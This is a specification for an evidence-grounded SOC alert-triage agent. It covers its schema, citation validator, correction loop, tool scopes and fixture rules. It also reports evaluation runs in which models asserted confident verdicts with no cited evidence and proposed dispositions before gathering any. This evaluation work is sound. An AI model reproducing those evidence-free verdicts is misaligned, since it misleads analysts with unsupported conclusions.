# alert_forensics, specification

An agent that triages SOC alerts, cites the evidence behind every claim, states what it
could not establish, and is measured against ground truth. Python, LangChain 1.4,
LangGraph 1.2.

Sibling project to [pod_forensics](https://github.com/ndogota/pod_forensics), which
applies the same method to Kubernetes incident diagnosis.

## Why this project, in three numbers

Reported false-positive rates range from 45 to 83 percent depending on methodology.
Roughly 0.01 percent of daily alerts relate to a real attack. Human accuracy drops
about 40 percent over a twelve hour shift once the false-positive rate passes 80.

So the interesting question is not whether a language model can read an alert. It is
whether its verdict can be trusted, and where it breaks. That is what gets measured
here.

## Design requirements, and how each is met

Nothing here is answered with prose. Each requirement maps to a mechanism.

| Requirement | Implementation |
|---|---|
| distinguish observed facts from assumptions | three separate lists in the schema, not one summary |
| reference the supporting information | every fact carries a `tool_call_id`, validated against the real trace |
| make missing context explicit | entries carry what, why it matters, how to obtain it |
| output usable by existing workflows | machine-consumable JSON, not prose for a human |
| know where conventional code beats a model | deterministic pre-processing, listed and named below |
| keep the analyst in control | human-in-the-loop interrupt on every write action |
| measurable reliability | ground-truth eval set, failed runs counted, Wilson intervals |
| quality, latency and cost | all three measured per investigation from real usage metadata |
| access control, sensitive data, traceability | tool scopes, redaction before the model, full audit trail |

## The centerpiece: grounded claims

LangChain has no native mechanism linking a model claim to the tool call that produced
it. The only guaranteed identity link in a trace is
`AIMessage.tool_calls[i]["id"] == ToolMessage.tool_call_id`. So the grounding is built:

- Each tool keeps its raw upstream response out of the model's context. The
  `ToolMessage.artifact` carries the `ToolCallRecord` the runner journalled, whose
  `raw_response_ref` and `raw_response_sha256` point at the raw in the store. The
  artifact never reaches the model; the raw never enters the message history at all.
- The output schema requires `evidence: list[str]` of tool call ids on every observed
  fact.
- A validator resolves every id against the actual trace. An id that does not resolve,
  or that resolves to a denied or failed call, makes the output invalid and the
  correction loop asks the model again. So does an id that resolves to the disposition
  proposal (problem kind `cites_non_evidence`): the proposal is addressed to the
  analyst, it reads no system, and a fact resting on it rests on the model's own
  words.
- A fact may correlate several source systems: a sign-in from Defender and an identity
  from Splunk cited together is one fact, not a defect. The systems a fact rests on are
  resolved from the cited records in the trace and reported on the grounding report as
  `source_systems`. The model never asserts them.
- Silence does not score. A result with no observed facts is grounded only when the
  verdict is `inconclusive` and `missing_context` names what could not be established.
  Seen against a real model for the first time on 2026-09-15, twice, on scenario 5, and
  kept under `runs/lsass_access/campaign-3/` and `runs/lsass_access/campaign-5/` so it
  can be replayed. Both first passes wrote three observed facts, and not one cited a
  tool call: the first cited `RB-0520`, the id of the runbook entry inside a response,
  beside the alert's own id; the second cited the alert's own id three times. The
  validator refused every citation as `unknown_id`. The repair instruction offered the
  first run two citable calls, among them the runbook query that had returned RB-0520,
  and the second run one; both models withdrew all three facts rather than re-cite,
  which is a repair the instruction allows. What came back was a result with zero
  observed facts, three or four assumptions restating the alert, and a verdict asserted
  anyway: `benign_true_positive` at confidence 1.0 in one run and `true_positive` at
  0.9 in the other, opposite verdicts on the same evidence-free result, neither
  `inconclusive`, and neither naming the missing context that would have made silence
  honest. The rule refused both. Both runs are `failed_ungrounded`, not laundered into
  `inconclusive`, and had the rule read the other way one of them would have been a
  correct verdict with no evidence behind it, counted in the summary. The rule is
  unchanged. Seen a third time the same day on scenario 7, from a run that made no tool
  call at all and asserted `benign_true_positive` on the alert alone; scenario 7's
  section has it.
- The metric `ungrounded_claim_rate` is enforced to zero rather than hoped for.

A claim that cannot be attached to a tool call is not a fact. It belongs in
`assumptions`, or it does not exist.

## The correction loop

When the validator rejects a result, the model is asked to repair it. Three decisions
bound that loop. Each is a decision, not an option, and carries its reason.

**One correction attempt, two model passes in total.** The attempt count is
configurable (`max_corrections`, default 1). The defects the validator catches are
invented ids and citations of failed calls. A model that cannot repair those with the
problems spelled out in front of it will not repair them on a third pass, and an
unbounded loop makes the measured cost and latency per investigation meaningless: a
number that depends on how many times the harness was willing to retry is a property of
the harness, not of the model.

**The second pass receives a repair instruction, not the report.** For each offending
fact it gets the statement, the offending evidence id, the problem kind, and the list of
`tool_call_id`s in the trace that a citation can succeed on. It does not get the
already-grounded facts, the trace, or the raw responses. The loop repairs citations; it is not a second
chance to reason. If it were, the harness would measure the wrong pass: a verdict that
is right only after the model was told which citations were fictional is not the verdict
the first pass produced.

Three details make that sentence precise, decided here because the sentence alone
leaves them open:

- The second pass is a fresh model call, not a continuation of the investigation
  thread. Continuing the thread would hand the model every tool response again, which
  is the trace in all but name. The instruction is the only user content it sees.
- A bare id carries no meaning, so each present id is listed with the tool it called,
  the arguments the model itself wrote, and the outcome. Never the response: what the
  call returned is exactly what the model may not re-read.
- **Present means citable.** The list holds only the calls whose outcome is `ok` and
  whose source system returns evidence. A denied call, a failed call, and the
  disposition proposal are left out. The list is the menu the second pass chooses from,
  and one correction attempt is the whole budget, so an id offered there that the
  validator will then refuse is the loop inviting the failure it exists to repair. The
  proposal is the worst of them: its record carries the model's own summary restating
  the verdict, which makes it the most tempting citation in the list and the one that is
  never evidence. This was found on the committed scenario 1 recording, whose
  instruction offered the proposal's id sixth; re-citing it would have ended the run
  `failed_ungrounded` with no pass left. The alternative, listing every call with the
  reason it cannot be cited, was rejected: the offending entries already say why each
  refused id was refused, and the second pass has nothing to do with a call it may not
  cite. The outcome stays on each entry and now reads `ok` throughout, because an
  artifact recorded before this rule shows lists that offered denied calls and the
  proposal, and the field is what lets a reader see that. A trace with no citable call
  gives an empty list; the only repair left is to withdraw, and the run fails as it
  should.
- The second pass returns citation repairs, not a result. For each offending fact, by
  index, it either re-cites from the present ids or withdraws the fact, giving the
  reason it could not be verified. The harness applies the repairs: a re-cited fact
  keeps its statement with the new evidence, a withdrawn fact moves to `assumptions`,
  a repair naming a fact that was not offending is ignored, and an offending fact the
  repair does not mention stays as it was. Verdict, confidence, techniques, recommended
  action, escalation, missing context and the grounded facts are the first pass's and
  cannot be touched. The repaired result is validated again, by the same validator.

**A run that leaves the loop still ungrounded is a failed run, never inconclusive.**

```
RunOutcome
  completed          the loop ended with a grounded result
  failed_ungrounded  the loop ended and the result is still ungrounded
  failed_error       no result was produced: model error, unparseable output, budget
```

The evaluation reports the failure rate as a first-class number beside accuracy, split
by outcome, and a failed run scores zero on every accuracy metric. A run the provider
refused to serve is not a failure of the model and is counted apart, see "A provider
refusal is the quota's number" under "Evaluation". `inconclusive` is a
verdict an analyst is sometimes right to give: the evidence really was insufficient and
the missing context says why. Laundering a failure into it would destroy the meaning of
verdict accuracy, the same way collapsing `benign_true_positive` into `false_positive`
loses the tuning decisions.

## The run artifact

One investigation produces one artifact, and the outcome lives on it beside the trace
and the report, not in a log line.

```
RunArtifact
  investigation_id
  outcome            RunOutcome
  model              the provider:model string the run was started with
  model_limits       {timeout_s, max_retries} the model client was bounded with, or null
                     for the scripted client, which makes no network call
  output_binding     {strategy: provider | tool, profile_declared, structured_output,
                     strict}: how structured output was bound, the profile values that
                     decided it, and whether the provider was asked to enforce the schema
  role               the role the tools ran under
  adapters           {tool: fixture | live | recorded | local}, what actually served each tool
  fixture_labels     the stub labels the fixture adapters were bound to, see the tool layer;
                     empty when no fixture adapter served the run or on a recording before the rule
  trace              InvestigationTrace: alert, every tool call, usage per model turn
  report             GroundingReport of the final result, or null when no result was produced
  passes             model passes that produced a result: 1 plus the corrections made
  corrections        [{instruction sent, repairs received, report before them}], one per pass
  decisions          [{tool_call_id, proposal, decision: accepted | rejected, reason}]
  error              {kind, message} on failed_error; on failed_ungrounded when the
                     correction pass itself failed; never on completed
  raw_store          directory the trace's raw_response_refs resolve under
```

- The result is not a separate field: the report carries it, and a report that
  disagrees with its result refuses to validate. `report.result` is the result.
- `output_binding` records the resolved structured-output strategy and the profile
  values the decision read: whether the model declared a profile at all, and the value
  of `profile["structured_output"]` as read, null when absent. A recording that cannot
  say how its output was bound cannot be reproduced, and the model string alone does not
  say it: a profile changes with the provider package version. `strict` says whether the
  harness asked the provider to enforce the schema: true under the provider strategy
  since the rule under "Model independence"; null under the tool strategy, which has no
  such flag, and the contract refuses a value there. A recording written before the
  field existed carries none and reads null under `provider` too, and null means the
  flag was not recorded, not that it was not asked: fourteen of the fifteen recordings
  were bound without it, since nothing passed the flag before the rule, and the strict
  probe was bound with it by the probe script; the artifact says neither, and the
  contract does not guess. Since every provider-bound run after the rule records true,
  null under `provider` is exactly a recording from before it.
- `model_limits` sits beside `model` because the two numbers change the latency the
  evaluation measures: a call that was allowed six retries with exponential backoff and
  a call that was allowed one are not the same measurement, even on the same model.
  The artifact records what was asked of the client, verbatim; what a provider does
  with it is the provider's, see model independence.
- Usage per model turn is read from `usage_metadata` on each `AIMessage`, the
  provider-agnostic field, and numbered by the message's position among the model turns.
  That is the same numbering a `ToolCallRecord.step` uses, so a record and the turn that
  emitted it agree.
- `passes` counts model passes that produced a result. The trace's `usage` counts every
  model turn, including the tool-calling turns; the two are different numbers on
  purpose.
- A correction pass that raises leaves the first pass's ungrounded result standing:
  the outcome is `failed_ungrounded`, with the error recorded beside the report. It is
  not `failed_error`, because a result was produced; it is not laundered either.
- A correction pass that returns no repairs, prose instead of the schema, counts as an
  empty repair: the result is validated again unchanged and fails as it stood.
- On `failed_error` the trace still holds every call that was journalled before the
  failure. The artifact is written whatever the outcome, so a failed run is inspectable.

## Where conventional code wins

Stated explicitly, because the judgement matters more than a blanket use of models.

- Entity extraction and IOC parsing: parsers, deterministic.
- MITRE ATT&CK technique resolution: lookup in the official STIX bundle by
  `external_references.external_id`, never asked of the model.
- Playbook thresholds: password spray is 100 or more accounts, 5 or more countries, 25
  or more source IPs. That is arithmetic, and arithmetic does not hallucinate. Not yet
  built: scenario 2 is the scenario that exercises it, and its section under
  "Evaluation" says what the model is handed instead until it is.
- VirusTotal interpretation: `last_analysis_stats` is a dict of engine counters and
  `reputation` is a signed community vote, often zero on rarely seen objects. Both are
  read by code; the model receives the reading, not the raw temptation.
- Deduplication and correlation on entity keys.
- Source-system attribution of every observed fact: resolved from the cited tool calls
  in the trace, never declared by the model.

The model is used for what remains: hypothesis, pivot selection, weighing contradictory
signals, and writing the summary.

## Output schema

```
TriageResult
  verdict            true_positive | false_positive | benign_true_positive | inconclusive
  confidence         float
  mitre_techniques   [T####.###]  resolved deterministically, not invented
  observed_facts     [{statement, evidence: [tool_call_id]}]
  assumptions        [{statement, why_unverified}]
  missing_context    [{what, why_it_matters, how_to_obtain}]
  recommended_action str
  escalate           bool

GroundingReport      produced by the validator from a TriageResult and its trace
  result             the TriageResult it describes, carried so the report stands alone
  facts              [{index, statement, evidence_ids, resolved_ids,
                       source_systems: [defender | splunk | ...], problems, grounded}]
  ungrounded_claim_rate, is_grounded, no_facts
```

The source systems live on the report, not on the fact: they are derived from the trace.
A result never travels without its report, and that is structural: the report carries
the result and refuses to validate if its facts or summary disagree with it.

`benign_true_positive` is a first-class verdict because a SOC needs it: the detection
fired correctly and the intent was legitimate. Collapsing it into false positive is how
tuning decisions get lost.

### The four verdicts

The first real model run reasoned correctly and labelled wrongly: it wrote that the
travel "does not indicate malicious impossible travel" and was a "known artifact of
corporate proxy routing", then returned `benign_true_positive` where the ground truth is
`false_positive`. The verdicts had no discriminating definition anywhere, so the label
was a coin toss between two values that both sounded right. Until the definition exists,
a comparison matrix measures the ambiguity of the prompt, not the capability of the
models.

A detection produces a signal, which is what its logic measured, and an assertion,
which is what it claims about the world. The signal is almost always true; a log line
really was written. The verdict turns on the assertion, never on the signal.

- `true_positive`: the assertion is true and the activity is malicious or
  unauthorised.
- `benign_true_positive`: the assertion is true and the intent was legitimate and
  authorised. The rule worked.
- `false_positive`: the assertion is false. The signal may be perfectly real and still
  support no such conclusion.
- `inconclusive`: the evidence does not decide, and `missing_context` names what
  would.

A verdict states what is true. What the SOC should do belongs in `recommended_action`,
which exists for it, and no definition above carries an action. Scenario 8 is the
reason: on the truth axis nothing separates six from eight, both are false positives
whose signal was real, and on the action axis everything does. Six tunes permanently,
by excluding the scanner's account from the ticket rule. Eight tunes nothing at all: a
rule that fires on a departing employee pushing 6.2 GB to personal storage is doing
exactly its job, a human looked and found photographs, and next time the 6.2 GB is
source code. A definition that said "tune" could not say that.

The two are separated because a claim read at the level of the signal is almost always
true, and a label that turns on it collapses false positives into benign true positives:
two geo-IP locations far apart in a short window is a true computation, and the
assertion drawn from it, that the person was in two places, is false. That is the error
the first real run made. The assertion is the state of the world the rule is named for,
at the granularity of the technique it detects, with intent left out: intent is the
other axis, and an assertion that included it would leave no room for a benign true
positive. The label must not depend on which sentence describes the alert.

The definition is an analyst's, and it lives in the system prompt as the definition of
the four values, in exactly these terms. Nothing scenario-specific goes beside it: the
taxonomy belongs in the prompt, the answer to any given alert does not. Every scenario's
ground-truth label is checked against this discriminator under "Scenarios", with the
signal and the assertion stated separately; a ground truth that contradicts its own
discriminator makes every accuracy number meaningless.

## Tool surface

Nine read-only tools and one gated write action. Every tool sits behind a `ToolAdapter`
that declares its required scope and its response shape. Shapes follow the real APIs, so
a fixture-backed tool is ported to a tenant by writing a new adapter, not by changing
the shape the agent sees.

| Tool | Shape follows | Adapter |
|---|---|---|
| `search_events` | Graph `security/runHuntingQuery`, `schema[] {name,type}` plus `results[]` | fixture |
| `search_siem` | Splunk search v2, sid then results, SPL string in | fixture |
| `get_identity` | Splunk Asset and Identity framework, priority drives urgency | fixture |
| `get_asset` | same framework, device compliance and criticality | fixture |
| `lookup_ioc` | VirusTotal v3, JSON:API envelope, epoch dates, engine counters | **live**, free API key |
| `get_related_alerts` | Microsoft Graph `security/alerts_v2` | fixture |
| `get_process_tree` | `DeviceProcessEvents` lineage through the hunting API | fixture |
| `search_runbook` | internal knowledge, the retrieval component | fixture |
| `get_attack_technique` | ATT&CK STIX bundle, deterministic, not a model call | **live**, public bundle, no key |
| `propose_alert_disposition` | the project's own shape; there is no upstream | local, writes nothing |

### The one write action

"Human in the loop on every write action" is a promise until there is a write action to
gate. `propose_alert_disposition` is that action, and it is deliberately the smallest one
that can exist:

- It takes a verdict, a recommended action, whether to escalate, and a one-paragraph
  summary. It records the proposal in the journal like any other call and returns an
  acknowledgement that says nothing was written. It changes no alert, no case, no
  notification, anywhere. The sentence "the agent never closes an alert, it prepares
  the investigation and proposes" is what this tool does, and the run artifact shows
  it.
- It requires the scope `alerts:write`. The `analyst` role holds it; `tier1` does not.
  A tier1 run that proposes is journalled as `denied`, which is the same structured
  denial every other out-of-scope call gets.
- It always interrupts, whatever the arguments. The interrupt is the gate on the action
  and the scope is the permission to perform it, checked in that order: a human who
  accepts a tier1 proposal has not granted tier1 a scope, and the journal says
  `denied`.
- Its source system is `human`: it reaches no upstream, and its counterpart is the
  analyst who accepts or rejects. A record from `human` is not evidence, and the
  grounding validator says so.
- Its live status is `local`: neither fixture nor live, complete as shipped.
- **It comes after evidence, and it comes alone.** The first real model run proposed at
  step 0, in the same parallel batch as the first two evidence calls, before any result
  was back, and the analyst was asked to approve a verdict built on nothing. The
  definition declares two ordering rules, enforced in code and not in the prompt:
  `needs_evidence`, the tool is not offered to the model until at least one call with
  outcome `ok` exists in the trace; and `alone_in_turn`, it may never be emitted in the
  same turn as another tool call. Enforcement has two halves. A middleware filters the
  tool out of the bound tools while the trace holds no `ok` record, and when the model
  emits a call that breaks either rule it jumps the turn straight to the tool node, past
  the interrupt: a proposal that will be refused is not put in front of the analyst. The
  runner then produces an `OrderDenial`, the same shape as a scope denial with the rule
  in place of the scope, journalled with outcome `denied`; the model reads the rule and
  the sibling calls of the turn run normally. Scope is checked before order: who may
  propose at all comes before when.

The agent is told to propose before it answers. A run in which the model never
proposes still completes; the artifact's `decisions` list is empty and the evaluation
can count that.

### The tool layer

A tool call travels through one pipeline, whatever the adapter behind it:

1. Scope check. The principal's scopes are compared with the tool's declared scope. A
   miss produces a `ScopeDenial`, journalled with outcome `denied`. The adapter is never
   called.
2. Order check, for a definition that declares ordering rules. A call before any `ok`
   record, or beside another call in its turn, produces an `OrderDenial`, journalled
   with outcome `denied`. The adapter is never called. The runner learns the turn's
   sibling calls from the caller, since a call may run before its siblings are
   journalled.
3. Argument validation against the tool's request model. A miss is journalled as
   outcome `error`, kind `invalid_arguments`, with the validation message, so the model
   can correct the call.
4. The adapter fetches the raw upstream response. Any upstream failure, including a
   fixture that has no answer for the request, is journalled as outcome `error` with a
   structured `ToolFailure`. Nothing raises into the agent.
5. The raw response is stored out of context and referenced from the record by
   `raw_response_ref` and `raw_response_sha256`. It is stored whether or not it
   validates against the response shape: a malformed response is still evidence.
6. The raw response is validated against the response shape, projected to the tool's
   view, then passed through the generic redaction. The projection is what the model
   sees, verbatim, as `redacted_response`.

Decisions the pipeline rests on:

- Scopes are the project's own strings (`hunting:read`, `siem:search`, `identity:read`,
  `asset:read`, `ioc:lookup`, `alerts:read`, `runbook:read`, `attack:read`, and the one
  write scope `alerts:write`), each mapped to the live permission in the adapter's
  documented contract. Two roles ship: `analyst` holds every scope; `tier1` holds every
  read scope but `siem:search`, since raw SPL is commonly gated above tier one, and not
  `alerts:write`, since tier one escalates rather than disposes. A role that is really
  restricted is what makes the denial path something the harness exercises rather than
  a theoretical branch.
- The model is offered exactly the tools that have an adapter registered for the run,
  in the registry's order. A tool with no adapter is not a tool the model can call
  usefully, and offering it would journal `unknown_tool` errors for calls the harness
  invited.
- Response shapes tolerate unknown fields, since real APIs add them. Views forbid them,
  since a field the model sees that nobody declared is a redaction gap.
- Tabular views are allowlisted per tool and capped at 50 rows; the model is told the
  total row count, a `truncated` flag, and the number of dropped columns. The tool
  description tells the model to project to standard columns, so a query that returns
  only dropped columns is a query it can rewrite.
- Redaction is two-layered, with the guarantees stated under "Access control, sensitive
  data, traceability": the projection is the guarantee, the generic pass is the backstop.
- A call to a tool that does not exist, or that has no adapter registered, is journalled
  as an `error` of kind `unknown_tool` with source system `none`. The journal never files
  a call under a system it did not reach.
- Fixture adapters match a request against stubs: an exact value, `$contains`,
  `$regex` or `$any` per argument, or `$all`, a list of those that must every one hold,
  so a stub can require both the shape of a request and the entity it names in one
  place a reviewer reads. A request no stub answers is an `error` of kind
  `no_fixture`, never a silent empty result, so a fixture gap shows in the trace
  instead of being read as absence of evidence. **There is no fixture default.** The
  format once allowed one, and five of the nine fixtures declared an empty one, which
  contradicted the sentence before it and won in code: a request the stubs did not
  anticipate was answered with an empty result that the model read as a reading. The
  committed scenario 1 recording shows it twice. The model queried the runbook with
  "VPN SASE corporate egress proxy Amsterdam Paris", the stub matched only the phrase
  "atypical travel", and the default answered no hits, on the one source that says what
  the egress address is. It asked for the identity of `jdoe@contoso.com`, the stub
  matched only `jdoe`, and the default answered that the identity was not found. Neither
  was a reading; both were gaps, and the trace filed both as `ok`. A default cannot tell
  a reading nobody has seen from a query nobody anticipated, and the second is exactly
  what the trace must show. A real empty reading, an indicator VirusTotal has never
  seen, a user with no related alerts, is a stub whose match names the request it
  answers, so it is a declared reading a reviewer sees in the file, the way
  `never-seen.example` already is. None of the five defaults was that: each answered
  every request its stubs missed, including a variant spelling of the alert's own
  entities, so all five are removed and a fixture file that declares a default refuses
  to load. For the same reason a stub must constrain at least one argument: an empty
  match, or one whose every value is `$any`, is a default under another name and is
  refused too. What the model sees on a gap is the same structured failure any error
  gets, kind `no_fixture` and the arguments it sent, so it can rewrite the request or
  say what it could not obtain; and the trace says the harness, not the world, ran out.
- **A stub on a free-text request answers only questions about the entities its
  response holds.** For a query tool, `search_events` and `search_siem`, the match
  requires the query to name the principal entity of the rows it returns, an account,
  a device, an indicator, an action type, and not only the table or the index: a table
  name is a shape, and a shape matches every user. For the runbook, the match requires
  the query to name the entry's subject, the alert type its title names or a proper
  entity the entry names, a product, a range, an address, and never a generic
  infrastructure word such as egress, gateway, proxy or VPN, which every scenario's
  questions use. The reason is the one thing this project sells. An empty result is
  visibly nothing; a wrong result is indistinguishable from evidence. A fact built on
  another user's sign-in rows cites a call whose outcome is `ok`, the validator grounds
  it, the run completes, and the harness scores a fact about the wrong person as a
  reached finding, with no mark anywhere in the trace. The widening that replaced the
  defaults did exactly this on both free-text tools: the sign-in stub keyed on the
  table name answered a query about `mmartin@contoso.com` with jdoe's rows, and the
  runbook stub keyed on infrastructure words answered a question about an RMM relay,
  and one about a Kerberoasting scanner, with the atypical-travel entry at score 0.91.
  The rule that a stub must constrain at least one argument does not catch it, since
  the table is an argument. The three entity tools already obey it by construction,
  because their request is the entity. What is structural and what is not, stated:
  no default and at least one constraint are held by the loader; this rule is not,
  because the loader cannot read what a query is about, so it is held on the shipped
  fixtures by tests that ask each free-text stub about another account and another
  subject and require `no_fixture`, and every scenario's stubs arrive with those tests.
  Since the binding decided below, the rule governs what a stub answers within its own
  scenario; it is no longer what stands between one scenario's stub and another
  scenario's run.
  The cost is a narrower hit: a query that names the table and not the account, or
  the runbook asked about egress points without naming the travel alert or the SASE
  product, is a visible `no_fixture` error the model can rephrase, and that is the
  right side to err on.
- **What an entity is when a scenario's subject is an exercise or an address, not a
  user.** The first real campaign showed the entity rule right and the entity list
  short. Scenario 5's runbook stub keyed on the account and the host as the alert spells
  them, and a real model asked the runbook for `purpleops`, `PurpleOps`, `purple` and
  `rt-cred`: the programme's name as the account and the folder carry it, and the tool.
  Scenario 2's query stubs keyed on the account, and a real model pivoted on the source
  address, asking the hunting API what `192.0.2.44` did and the runbook whether it knew
  the address. Seven calls refused across the two scenarios, and in one run they were
  every evidence question it asked, for entities the rows held and the stubs did not
  name. So the rule is stated for the case. The entities a stub keys on are every proper
  name its rows or its entry hold: for a scenario about an exercise, the exercise's
  identifier, its programme name with the stems that name carries, the operator
  account, the host and the tool; for a scenario about an address, the address as well
  as the account it reached. A stub keyed on the account alone answers the analyst who
  pivots on the actor and refuses the one who pivots on the source, and both are
  analysts. The widening is by entity: no key becomes a table name or an action word,
  so the collision probe and the binding apply as before. A declared empty reading
  stays one: the runbook asked for the bare address answers no hits, from a stub that
  names the address, because a knowledge base does not hold an attacker's address and a
  `no_fixture` there would say the harness ran out when it is the runbook that has
  nothing.
- **A stub names the scenario it serves, and no stub answers another scenario's
  question.** Eight scenarios share nine fixture files and the first matching stub wins
  in file order. The entity rule makes a collision unlikely and nothing prevented one,
  so the check is made structural where it can be and run over whatever scenarios are
  present where it cannot. Every stub carries `scenario`: the stem of the scenario it
  was written for; `shared`, for a reading that does not depend on who asks, an ATT&CK
  technique, an indicator VirusTotal has never seen; or `test`, for a stub that exists
  for the test suite and no scenario. A `shared` stub may match only by exact value,
  never by operator, so it can answer only the one entity it names; the loader refuses
  anything else. For the rest, the suite builds a probe from every alert under
  `examples/`: its title, its description, every string its evidence carries, and its
  techniques. The probe is put to every stub that is not the alert's own, as the text
  of every operator matcher and, entity by entity, as the value of every exact one; a
  stub that would answer is a collision and the suite fails, naming the stub and the
  scenario. A label that names no scenario present, and is not `shared` or `test`,
  fails too, so a label cannot go stale. The test runs over the scenarios that exist,
  so a new scenario is checked against every earlier one by arriving, and every earlier
  stub is checked against it; nothing rests on each scenario bringing its own promise.
  File order still decides between two stubs of one scenario, which is that scenario's
  own business.
- **What the collision probe holds, and what it does not.** The probe above is built
  from the alert's text, and the collision that created the rule did not come from an
  alert. It came from a model's question: the runbook stub keyed on infrastructure
  words answered "VPN SASE corporate egress proxy Amsterdam Paris", and no alert
  carries those words. Verified before this was written: a runbook stub matching
  `(?i)egress|gateway|proxy|vpn`, the exact shape of the defect, produces no collision
  under the alert probe, because no alert under `examples/` contains any of them. So
  the alert probe is stated for what it is. Held: no stub answers a question made of
  the entities another alert names, its title, its description, its evidence and its
  techniques. Not held: no stub answers a question a model would ask about another
  alert, because the loader cannot read what a model would ask. The nearest thing to
  that corpus is the questions models have actually asked, and those are committed:
  every recording under `runs/<scenario>/` holds every request its model made, with
  the tool and the arguments verbatim. The probe therefore also puts every request of
  every committed recording to every stub that does not serve that recording's
  scenario, as the request was sent, through the same matcher the adapter uses; a
  stub that would answer is a collision, named with the recording it came from. The
  corpus was one run when this was written and is fifteen recordings across eight
  scenarios as of 2026-09-15, one of them holding no request at all; it grows with
  every recording, which is the point: a
  scenario is checked against the questions real models asked about every other one,
  and a stub that widens later is checked against every question already on file. A
  recording whose directory names no scenario present cannot be attributed and fails
  the check rather than being skipped. This is still best effort, and said so: the
  questions a future model asks are not on file until it asks them. Since the binding
  decided next, the probe is a second check on the shipped fixtures, not the only one.
- **A stub is offered only to the run of the scenario it serves.** The entity rule
  cannot hold on an aggregate. Scenario 2's tenant-wide failure aggregates are keyed on
  a sign-in table, a failure marker and an aggregation keyword, and nothing else,
  because their rows are about 137 accounts and 31 addresses the model cannot name
  before it asks: there is no entity to key on. Verified against the shipped fixtures
  before this was written: `SigninLogs | where ResultType != 0 | summarize
  dcount(UserPrincipalName), dcount(IPAddress) by bin(TimeGenerated, 1h)`,
  `AADSignInEventsBeta | where ErrorCode != 0 | summarize count() by Country` and
  `index=auth action=failure | stats dc(user) by src_country` were each answered with
  the spray row, and none names rbennett or belongs to scenario 2. A model
  investigating scenario 3 that checks whether its three users were sprayed is handed
  a tenant-wide spray it can cite; the call is `ok`, the validator grounds the fact,
  and the verdict proceeds from it. That is the silent wrong answer again, in the tool
  that carries the most findings, and the probe cannot see it until a later
  scenario's recording contains such a query, which is after that run is paid for. No
  wording fixes it, so the labels every stub already carries are made load-bearing at
  run time rather than only in a test. Decided:
  - The fixture set is bound to the alert under investigation. A stub labelled for a
    scenario is offered only when the alert is that scenario's; a `shared` stub is
    always offered; a `test` stub is never offered to a run, since it exists for the
    suite; a request that matches no offered stub is the `no_fixture` error it already
    is, with the same message, since the model must not learn that the harness held an
    answer it withheld. The adapter holds the labels in view and tries no other stub,
    so the guarantee is the adapter's, not a test's.
  - The adapter learns the scenario from the alert's id, never from a file name. The
    fixture directory carries `scenarios.json`, a manifest from scenario label to the
    id of the alert it serves; the alert's id is the identity the truth contract
    already pairs on, and a copy of the alert under another name is still that alert.
    The loader refuses a stub whose label names no scenario in the manifest and is not
    `shared` or `test`, which is the stale-label check made structural; a test holds
    the manifest to the scenarios under `examples/`, name for name and id for id.
  - The artifact records `fixture_labels`, the labels the fixture adapters were bound
    to, so a `no_fixture` in a trace is read against what was in view. A recording
    made before this rule shows an empty list, and the committed scenario 1 recording
    is one: everything was in view when it ran.
  - What it costs, stated: the fixture set stops being a flat pile of stubs, and
    `--fixtures DIR` gains a rule, the manifest, without which only `shared` and
    `test` stubs load. An alert whose id is in no manifest has no scenario in view:
    only `shared` stubs are offered, every fixture-backed request is `no_fixture`,
    the console script says so once on stderr before the run, and the artifact's
    `fixture_labels` holds `shared` alone. That is the right side to err on: a run
    that cannot say which scenario's evidence it should be handed is handed none,
    visibly, rather than the union of every scenario's. The test suite binds what a
    test needs, `test` stubs included; the console script and the harness bind
    exactly the alert's scenario.
- **One guarantee, two checks, and what a scenario author still does.** Three
  mechanisms now guard one defect, a stub answering a question from another scenario's
  run: stubs keyed on entities, the collision probe, and the run-time binding. Stated
  the way the redaction section separates its layers, because a reader who cannot tell
  which one holds cannot tell what a new scenario costs.

  **Guaranteed by structure: the binding.** The adapter is constructed with the labels
  in view and tries no stub outside them. A stub of one scenario is not unlikely to
  answer another scenario's run; it is not offered to it, and nothing the model asks and
  nothing an author writes in a match changes that. The guarantee is as good as the
  labels, and the labels are held: the loader refuses a label the manifest does not
  name, and a test holds the manifest to `examples/` by name and id, so a mislabelled
  stub fails to load and a stale label fails the suite.

  **Best effort by check: the collision probe.** It puts other alerts' text and other
  recordings' requests to every stub. Since the binding, the run-time path it guarded is
  closed. What it still finds is a stub that would answer another scenario's question,
  which is a stub keyed on a shape rather than an entity, a defect of the fixture and not
  of any run; such a stub is wrong for its own scenario too, and the probe is the
  cheapest way to see it. It cannot see a question no alert and no recording carries,
  and says so.

  **Best effort by test: the entity rule.** The loader cannot read what a query is
  about, so the free-text rule is held on the shipped fixtures by tests, and it now
  governs one thing: what a stub answers within its own scenario's run.

  What that means for the author of a scenario, since it decides the size of every
  remaining one:

  - Stubs need not be keyed on entities across scenarios. Two scenarios may each carry a
    sign-in stub keyed on the table and nothing else, and neither answers the other's
    run; the binding makes it so. That is no longer why the entity rule exists.
  - Looseness within a scenario still costs, and the binding does nothing for it. A run
    holds every stub of its scenario, first match wins in file order, and a stub keyed
    on a shape answers every question of that shape inside the run: the one it was
    written for and the one it was not. Scenario 3's audit stub answers a listing of the
    tenant's inbox rules, which is what it is for, and it also answers a listing of some
    other account's inbox rules with three rows about three other accounts, which is the
    wrong answer to that question. The cost is the one this project exists to avoid, a
    wrong result indistinguishable from evidence, now confined to one scenario's run. So
    the rule stands within a scenario: key a stub on the principal entity of its rows
    wherever the rows have one, an account, a device, an indicator, an address; put the
    entity-keyed stubs first in file order so a known entity gets its own rows; and
    where the rows have no entity, an aggregate or a tenant-wide listing, key on the
    action and say so beside the stub in the scenario's section, as scenarios 2 and 3
    do. Every scenario's stubs arrive with a test that asks each free-text stub about
    another account and another subject and requires `no_fixture`; a gap asserted with
    every label in view says that no scenario's stub answers it, and one asserted under
    a single scenario's binding says that scenario's stubs do not, which is the weaker
    claim and is used where a later scenario legitimately holds the subject.
  - A `test` stub is never offered to a run, so it may be as loose as its test needs. A
    `shared` stub is exact, so it cannot be loose.
  - The cost of a scenario is its own: its alert, its truth, its stubs keyed within
    themselves, and its tests. It does not re-audit the others, because the binding does
    not let it reach them, and the probe re-checks them on arrival for nothing.
- Live adapters take an injected HTTP client. The test suite drives them through a
  recorded response and a transport that never opens a socket. Nothing in the tests
  reaches a live API.
- VirusTotal "not found" is a successful call: an indicator unknown to VirusTotal is a
  reading, and the projection says so. An ATT&CK id that does not exist is an error of
  kind `not_found`: ids come from the alert or from the model, and an invented one must
  fail loudly.

Alerts follow the Microsoft Graph `security.alert` v2 shape, including the polymorphic
